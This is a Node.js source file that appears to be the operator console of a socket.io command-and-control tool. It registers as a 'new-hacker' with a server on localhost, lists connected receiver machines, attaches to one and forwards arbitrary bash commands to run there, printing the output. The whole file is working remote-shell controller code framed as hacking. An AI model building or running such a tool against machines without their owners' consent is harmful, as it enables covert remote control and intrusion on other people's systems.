const PORT = 7670;

const { exec } = require("child_process");
const io = require("socket.io-client");
const readline = require("readline");

const connectionAddr = "http://localhost";
const socket = io.connect(`${connectionAddr}:${PORT}`, {
  reconnection: true,
});

let USER = "";

exec("echo $USER", (err, stdout, stderr) => {
  if (err) console.log("There was a node error: ", err);
  if (stderr) console.log("There was a bash error: ", stderr);
  else USER = stdout;
});

const inputReader = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

socket.on("connect", () => {
  log("info", "Connected to server");
  socket.emit("new-hacker", USER);
});

socket.on("show-users", (users) => {
  if (users.length === 0) {
    console.log("No users connected");
    getCommand();
  } else {
    for (let i = 0; i < users.length; i++) {
      console.log(`\t${users[i]}`);
    }
    getCommand();
  }
});

socket.on("connect-user", (data) => {
  const { success, connectTo } = data;

  if (success === 0) {
    log("error", "User not connected to server");
  } else if (success === 1) {
    connection = connectTo;
  }
  getCommand();
});

socket.on("performed-command", (data) => {
  const { result } = data;
  console.log(result);
  getCommand();
});

socket.on("return", () => {
  log("info", `Disconnected from ${connection}`);
  connection = "UNCONNECTED";
  getCommand();
});

function log(title, message) {
  console.log(`[${title.toUpperCase()}] ${message}`);
}

let connection = "UNCONNECTED";

function getCommand() {
  inputReader.question(`${connection} % `, (command) => {
    if (command === "exit") {
      log("end", "Closing controller");
      inputReader.close();
      process.exit(1);
    } else {
      handleCommand(command);
    }
  });
}

function handleCommand(command) {
  if (command === "help") {
    handleHelp();
  } else if (command === "show") {
    handleShow();
  } else if (command.substr(0, "connect ".length) === "connect ") {
    handleConnect(command);
  } else if (command === "disconnect") {
    handleReturn();
  } else {
    handleDefault(command);
  }
}

function handleShow() {
  socket.emit("show-users");
}

function handleConnect(command) {
  if (connection !== "UNCONNECTED") {
    log("error", "Already connected to a user.");
    getCommand();
  } else {
    const connectTo = command.substr("connect ".length, command.length);
    socket.emit("connect-user", connectTo);
  }
}

function handleHelp() {
  console.log(
    "\nAVAILABLE COMMANDS: \n\tshow\n\tconnect <user>\n\t[all standard bash commands]\n\tdisconnect\n"
  );
  getCommand();
}

function handleReturn() {
  if (connection === "UNCONNECTED") {
    console.log("No connection established");
    getCommand();
  } else {
    socket.emit("return");
  }
}

function handleDefault(command) {
  if (connection === "UNCONNECTED") {
    console.log("Command invalid. Connect to a receiver first.");
    getCommand();
  } else {
    socket.emit("perform-command", command);
  }
}

setTimeout(() => getCommand(), 500);
